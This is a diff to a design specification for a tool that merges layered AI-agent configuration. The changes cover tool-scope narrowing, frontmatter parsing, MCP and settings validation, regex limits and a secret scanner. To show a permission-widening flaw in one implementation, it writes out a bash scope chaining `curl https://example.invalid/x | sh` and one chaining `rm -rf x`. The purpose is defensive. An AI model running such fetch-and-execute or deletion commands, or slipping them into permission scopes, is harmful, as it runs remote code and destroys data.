@@ -124,6 +124,46 @@ extend a private one). Build output inherits the **most private** visibility in 
 
 Every directory is optional. A layer may contain only `instructions/`.
 
+**Item paths.** The merge rules (§7) read these paths of a layer, and only these:
+- `layer.yaml` (§5.1);
+- `instructions/<name>.md`, `commands/<name>.md` and `rules/<name>.md`, directly in their folder;
+- `agents/<name>.md` (a base) and `agents/<name>.overlay.md` (an overlay), directly in `agents/`.
+  `<name>` is never empty, so `agents/.overlay.md` is no item;
+- `skills/<name>/<file>`: every file below a skill's folder belongs to that skill, `SKILL.md`
+  included;
+- `hooks/hooks.yaml`, and `hooks/scripts/<path>`: the scripts that a hook's `run:` names,
+  relative to `hooks/` (§7.5);
+- `permissions.yaml`, `mcp.yaml`, `models.yaml` and `settings.yaml`;
+- `targets/claude/CLAUDE.extra.md` (§7.1), and `targets/<target>/<path>` for a known target
+  (`claude`, `codex`), which are the passthrough files (§7.11).
+
+Any other path, such as a README or a folder of notes, is part of the content hash (§5.3) but is
+no item. One exception: each file below a folder in `targets/` whose name is not a known target
+is an error (code `passthrough`) that names the file (§7.11). A file directly in `targets/` is no
+item. The TypeScript `alz` merges files under any folder name there, warns for each file and
+writes none of them (reference drift, TASK-55.5).
+
+**Markdown frontmatter.** Instruction, agent, overlay, `SKILL.md`, command, rule and
+`CLAUDE.extra.md` files are Markdown with optional YAML frontmatter. CRLF line ends are read as
+LF.
+- A file that starts with `---` and a line feed has a block. The block closes at the next line
+  that is exactly `---`. The body is the text after that line's line feed, and is empty when the
+  file ends there. A line such as `----` or `--- x` neither opens nor closes a block. The
+  TypeScript `alz` closes the block at any line that starts with `---` (reference drift,
+  TASK-55.5).
+- The block is YAML, read with the rules of §7.13 "YAML limits". The whole file counts towards
+  the 1 MiB cap and must be strict UTF-8. A YAML error is located at the file's line and column
+  (codes `yaml`, `yaml-tag`).
+  - An empty block, a block of comments only and a `null` block are an empty mapping.
+  - Any other value that is not a mapping is the error `frontmatter must be a YAML mapping`
+    (code `frontmatter`).
+  - A block that is not closed is the error `frontmatter is not closed with '---'` (code
+    `frontmatter`).
+- A file that does not start that way has no block: an empty mapping, and the whole text as the
+  body. Neither the 1 MiB cap nor the control-character rule applies to it, only the 16 MiB cap
+  of every file (§5.3). It must still be valid UTF-8, or it is an error (code `frontmatter`). The
+  TypeScript `alz` reads it with the invalid bytes replaced (reference drift, TASK-55.5).
+
 ### 4.2 Where layers live
 
 - **Personal / public layers:** a git repo, e.g. `github.com/<you>/agent-layerz-personal`.
@@ -321,7 +361,9 @@ repository without `layer.yaml` is the error `no-manifest`.
   repository: not absolute and not starting with `~`. A `\` is read as `/`, the path is
   normalised and a trailing `/` removed. Among the additional directories the hub comes first, and
   duplicates are dropped.
-- `protected_paths` and `mcp.enable` are lists of text.
+- `protected_paths` is a list of text. `mcp.enable` is a list of server ids (§7.7). An entry that
+  is not a server id is a schema error, and the TypeScript `alz` takes any text there (reference
+  drift, TASK-55.5).
 - `budgets.instructions_max_lines`, `budgets.instructions_max_bytes` (32768 when absent, Codex's
   `project_doc_max_bytes`) and `budgets.always_loaded_skills_max` are whole numbers, 0 or more. A
   float without a fractional part, such as `2.0` or `1e3`, counts as a whole number (decision-28).
@@ -931,7 +973,28 @@ Rules:
   and order is kept.
 - **`tools` (narrowing rule):** an overlay may only remove tools or narrow a tool's scope.
   It may not add a tool the base didn't have, unless the overlay sets `allow_widen: true`
-  **and** the layer is not public. Violations are build errors.
+  **and** the layer is not public. Violations are build errors (code `tool-widen`) that name
+  the agent, the layer and the entry. After the overlay's edits, every entry must be
+  **covered** by an entry of the base. A base entry covers another entry of the same tool when
+  one of these holds:
+  - the base entry has no scope, or the two scopes are equal;
+  - for a path scope (`read`, `write`, `edit`, `grep`, `glob`, `notebook_edit`): the last segment
+    of the base scope is `**`, and the segments of the other scope (split at `/`) start with the
+    base scope's other segments, compared whole and as written. The other scope must have no `.`
+    or `..` segment. So `docs/**` covers `docs/adr/**` and `docs/a.md`, but not
+    `docs-private/a.md`;
+  - for a command scope (`bash`): the base scope ends in `*`, the other scope starts with the base
+    scope's text before its trailing `*`s, and the rest of the other scope holds no shell
+    operator: `;`, `&`, `|`, `<`, `>`, `(`, `)`, a backtick, a line feed or a carriage return. So
+    `mise run *` covers `mise run test`, but neither `mise run test && rm -rf x` nor
+    `mise run $(x)`.
+
+  Any other wildcard covers only an equal scope, and the scope of any other tool is covered only
+  by an equal one. The TypeScript `alz` reads every scope that ends in `*` as covering any scope
+  that starts with its text before the stars. So `write:docs*` covers `write:docs-private/**`,
+  and `bash:mise run *` covers `bash:mise run test; curl https://example.invalid/x | sh`: an
+  overlay can widen an inherited tool while the build takes it for narrowing. The Rust `alz`
+  refuses both (reference drift, TASK-55.5.6).
 - **Body:** `extend` appends a section per layer. `replace` replaces the whole body (the
   build warns about it).
 - `mode: replace` with no base means "define new". An overlay whose `extends` target can't
@@ -966,12 +1029,14 @@ Rules:
 - id: block-secrets              # unique id across the stack
   event: pre_tool                # neutral events: session_start | pre_tool | post_tool | stop | subagent_stop | prompt_submit
   match: { tools: [read, write, edit], paths: [".env*", "**/credentials*"] }
-  run: scripts/block-secrets.sh  # relative to the layer; copied into the repo output
+  run: scripts/block-secrets.sh  # relative to the layer's hooks/; copied into the repo output
   on_fail: deny                  # deny | warn | feedback
   targets: [claude, codex]
 ```
 
-- A hook has exactly one of `run:` (a script inside the layer, copied into the repo) or
+- A hook has exactly one of `run:` (a script of the layer below `hooks/scripts/`, named relative
+  to `hooks/` as in `scripts/block-secrets.sh`, copied into the repo; the TypeScript `alz` takes
+  any file below `hooks/`, reference drift, TASK-55.5) or
   `command:` (a command line used as written). In a command, `${PROJECT_DIR}` is the repo root;
   each adapter replaces it with its own variable. `timeout` is in seconds.
 - `event` may also be a target's own event, written `<target>:<Event>` (e.g.
@@ -1016,6 +1081,12 @@ playwright:
   env_from: [ ]            # names of env vars to pass through; values are NEVER stored here
 ```
 
+- A server id matches `^[A-Za-z0-9][A-Za-z0-9_-]{0,63}$`: an ASCII letter or digit, then up
+  to 63 ASCII letters, digits, `_` or `-`. Any other key of `mcp.yaml`, whatever it is, is an
+  error (code `mcp`) that names the layer and the file and prints the key quoted (§10.1). The
+  other servers of the file are still checked. The entries of the manifest's `mcp.enable` follow
+  the same grammar (§5.2). The merged servers are an ordered map keyed by server id. The
+  TypeScript `alz` takes any key (reference drift, TASK-55.5).
 - Same id → the most specific definition wins, and the whole entry is replaced.
 - Only ids listed in the repo manifest's `mcp.enable` are emitted (allowlist). The rest are
   defined but inactive, which keeps the token budget under control.
@@ -1037,6 +1108,8 @@ roles:
 ```
 
 - Aliases and roles are deep-merged, and the most specific value wins.
+- Each alias maps target names (`claude`, `codex`) to model ids. Any other key in an alias is an
+  error (code `models`) that names the file and prints the key quoted (§10.1).
 - An agent's `model: inherit` resolves through its `role`. An explicit alias overrides the role.
 - Concrete model ids live **only** here, so swapping models is a one-line change in one layer.
 
@@ -1048,8 +1121,23 @@ claude: { <native settings.json keys> }
 codex:  { <native config.toml keys> }
 ```
 
-Deep merge. Scalars: most specific wins. Arrays: concatenated and de-duplicated. These are
-passed through to the target **without validation** beyond a schema check where one exists.
+The top level of `settings.yaml` takes only the target names `claude` and `codex`, and each
+value is a mapping. Any other top-level key, whatever it is, is an error (code `settings`). The
+error names the layer and the file and prints the key quoted (§10.1), and none of that file's
+settings are merged. Per target, the merged settings are ordered maps of the keys that passed
+these checks. The TypeScript `alz` takes other top-level keys without an error (reference drift,
+TASK-55.5).
+
+The merge is a deep merge, a left fold in stack order:
+- Mappings merge key by key.
+- Two arrays are concatenated and de-duplicated, keeping the first occurrence. Two items count as
+  the same when they are equal as values, so mappings that differ only in key order are one item.
+  The TypeScript `alz` compares their JSON text instead (reference drift, TASK-55.5).
+- In every other case the more specific value wins, a change of kind included (an array replaced
+  by a scalar).
+
+The merged settings are passed through to the target **without validation** beyond a schema
+check where one exists.
 Keys that duplicate a first-class item (permissions, hooks, MCP, model) are rejected, so
 there is only one way to set each thing.
 
@@ -1121,7 +1209,9 @@ the agent works on matching files (e.g. `backend.md` → `src/**`).
 - Rules are how area conventions stay out of the always-loaded instructions budget.
 
 ### 7.11 Passthrough (`targets/<target>/…`)
-This is the escape hatch for target features the neutral schema doesn't cover. Files are
+This is the escape hatch for target features the neutral schema doesn't cover. Only a folder
+named after a known target (`claude`, `codex`) holds passthrough files; each file below any other
+folder in `targets/` is an error (code `passthrough`) that names the file (§4.1). Files are
 copied into place, and the most specific layer wins per path. The build warns on each use
 so passthroughs get turned into first-class items over time.
 
@@ -2061,6 +2151,39 @@ For layers with `visibility: public`:
   private hostnames and emails.
 - A public layer that `extends` a private one is an error (§3.1).
 
+**`forbid_patterns`.** Each entry is a regular expression. It is matched against the text of
+every file of the layer, the layer's `layer.yaml` without its `forbid_patterns` field included.
+A match is an error (code `leak-forbid`) that names the file and the entry by its number (`#1` is
+the first), never the matched text. The syntax is that of Rust's `regex-lite` crate
+(decision-38):
+- flags are written inline, such as a leading `(?i)` for case-insensitive matching;
+- `\d`, `\s`, `\w` and `\b` are ASCII only (`\w` is `[0-9A-Za-z_]`), and case-insensitive
+  matching folds ASCII letters only;
+- `\p{…}` classes, look-around (`(?=`, `(?!`, `(?<=`, `(?<!`) and backreferences (`\1` to `\9`,
+  `\k<name>`) are not supported.
+
+An entry is refused with code `leak-forbid` and its number when it:
+- uses look-around or a backreference (the message names the feature);
+- does not compile;
+- is longer than 512 characters;
+- compiles to more than 64 KiB or nests more than 32 levels.
+
+A layer has at most 64 entries. These limits bound the work that an untrusted pattern can cause.
+The TypeScript `alz` compiles the entries as JavaScript regular expressions, without these
+limits. So a pattern that relies on look-around, backreferences, `\p{…}` or non-ASCII case
+folding passes there and is refused by the Rust `alz` (reference drift, TASK-55.5).
+
+**Secret scan.** The built-in scanner looks for fixed token shapes:
+- GitHub, Anthropic, OpenAI-style, AWS, Google, Slack and Stripe keys;
+- private key blocks;
+- a long value assigned to a key named like `api_key`, `secret`, `token` or `password`.
+
+A finding is an error (code `leak-secret`) that names the file and the kind of token, never the
+text. In a public layer every file is scanned. In every layer, the definitions of `mcp.yaml` are
+scanned (§7.7). Two heuristics give warnings for public layers: `leak-email` for an email address
+and `leak-host` for a private host name (ending in `.internal`, `.corp`, `.lan`, `.intranet` or
+`.local`).
+
 - A `commit_identity` (§7.12) in a public layer is public. Prefer a no-reply address (for
   GitHub, `<id>+<user>@users.noreply.github.com`); any other address raises the usual
   `leak-email` warning, and `forbid_patterns` apply to it like any other line.
@@ -2209,6 +2332,49 @@ wrong. It never prints the field's value.
 
 The TypeScript `alz` prints more: unknown field names in full, a refused `ref` and refused
 `workspace` paths (reference drift, TASK-55.3).
+
+**Merge diagnostics** (TASK-55.5). These are the codes of §7 and §9.2. Each names the layer and
+the file as `<where>`.
+
+| Code | Level | Raised for |
+| --- | --- | --- |
+| `frontmatter` | error | a block that is not closed (`frontmatter is not closed with '---'`), a block that is not a mapping (`frontmatter must be a YAML mapping`), a Markdown file without a block that is not valid UTF-8 (§4.1) |
+| `instructions` | error | an instruction file's unknown field or `mode` (§7.1) |
+| `agent` | error | an agent's schema: name, description, unknown tool, skill name, a native key with a neutral field, too many preloaded skills (§7.2) |
+| `agent-duplicate` | error | a second base definition of an agent (§7.2) |
+| `agent-overlay` | error | an overlay's `extends` or `mode` (§7.2) |
+| `agent-replace` | warning | an overlay that replaces the whole body (§7.2) |
+| `tool-widen` | error | an overlay that widens a tool, or `allow_widen` in a public layer (§7.2) |
+| `skill` | error | a skill directory without `SKILL.md`, a name that is not kebab-case or not the directory's, a missing description (§7.3) |
+| `command` | error | a command's schema (§7.4) |
+| `skill-command-clash` | error | a skill and a command with one name in one layer (§7.4) |
+| `slot` | error | a `provides_slots` entry without its skill, or a `requires_slots` entry that is not a skill name (§7.3) |
+| `slot-missing` | error with `strict_slots: true`, else warning | a slot that no layer fills; the warning comes with a stub skill (§7.3) |
+| `slot-command` | error | an agent that preloads a command (§7.3, §7.4) |
+| `hooks` | error | a hook's schema, an id that a more general layer already uses, a disable entry with other fields (§7.5) |
+| `hook-locked` | error | disabling a locked hook (§7.5) |
+| `permissions` | error | the schema of `permissions.yaml` (§7.6) |
+| `permission-floor` | error | removing a deny rule of a more general layer, or a `default_mode` looser than a floor (§7.6) |
+| `mcp` | error | a key that is not a server id, a definition's schema, an `mcp.enable` entry that no layer defines (§7.7) |
+| `models` | error, or warning | the schema of `models.yaml`, an alias key that is not a target, an agent model that is not an alias; the warning is an alias without a model for a target (§7.8) |
+| `settings` | error | a top-level key that is not a target, a target value that is not a mapping, a key of a first-class item (§7.9) |
+| `protected-variable` | error | a protected or malformed variable name (§7.9) |
+| `rule` | error | a rule's schema (§7.10) |
+| `passthrough` | warning, or error | the warning for each passthrough file (§7.11); the error for a folder in `targets/` that is not a known target (§4.1) |
+| `leak-forbid` | error | a `forbid_patterns` match or a refused entry (§9.2) |
+| `leak-secret` | error | a value that looks like a token (§7.7, §9.2) |
+| `leak-email`, `leak-host` | warning | an email address or a private host name in a public layer (§9.2) |
+| `unresolved` | error | a reference to a more general layer that is not there: an overlay or `extend` rule without a base, disabling an unknown hook, a role or default naming an unknown alias (§7.2, §7.5, §7.8, §7.10) |
+
+`alz lint` checks each layer alone (§10) and leaves out `unresolved`. `alz build` reports it.
+
+How values print in these messages:
+- An item name that passed its grammar (an agent, skill, command, rule, hook or server id) is
+  printed as it is.
+- A key that did not pass is printed quoted, as above.
+- A value that a person needs in order to act, such as a deny rule or a tool entry, is printed
+  stripped (class 1 below).
+- A value refused as a protected variable or as a secret is never printed.
 
 **Exit codes.**
 - 0: the command did what was asked, with or without warnings.
@@ -2720,6 +2886,12 @@ environment unless a case sets them, because `mise run test` and an agent sessio
 
     The cases the TypeScript `alz` fails are marked as reference drift (`test/drift.ts`). Their
     `alz build` and `alz check` forms are checked against the Rust `alz` in R5 (TASK-55.6).
+
+29. **Settings and MCP keys** (TASK-55.5, `test/acceptance/37-settings-targets.test.ts`): a
+    settings or MCP file whose top-level key is not a known target is refused, whatever the key.
+    For `settings.yaml` the known targets are `claude` and `codex`; for `mcp.yaml` the keys are
+    server ids (§7.7). Through `alz lint --layer` the refusal is an error naming the file; through
+    `alz build` it also writes no output. Both are reference drift against the TypeScript `alz`.
 
 ---
 
